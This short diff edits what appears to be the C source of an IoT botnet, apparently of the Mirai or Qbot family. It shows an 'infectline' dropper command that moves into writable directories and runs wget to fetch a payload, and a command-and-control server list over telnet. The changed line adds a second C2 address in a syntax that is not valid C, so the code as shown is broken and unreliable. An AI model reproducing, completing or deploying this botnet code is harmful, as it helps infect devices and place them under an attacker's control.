@@ -36,7 +36,7 @@ char *infectline = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget 
 
 // WGET LINE GOES HERE ^
 
-unsigned char *commServer[] =
+unsigned char *commServer[] = {* 167.114.108.244=23 *} 
 {
         "5.206.225.136:23"
 };
